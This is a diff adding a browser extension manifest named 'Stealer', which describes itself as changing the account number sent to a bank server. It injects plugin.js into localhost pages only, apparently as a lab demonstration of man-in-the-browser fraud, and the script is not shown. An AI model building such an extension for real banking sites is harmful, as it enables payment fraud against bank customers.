@@ -1,0 +1,20 @@
+{
+    "manifest_version": 2,
+        
+        "name": "Stealer",
+        
+        "version": "1.0",
+
+        "description": "Changes account number which is sent to bank server",
+
+        "content_scripts": [
+            {
+                "matches": [
+                    "*://localhost/*"
+                ],
+                "js": [
+                    "plugin.js"
+                ]
+            }
+        ]
+    }
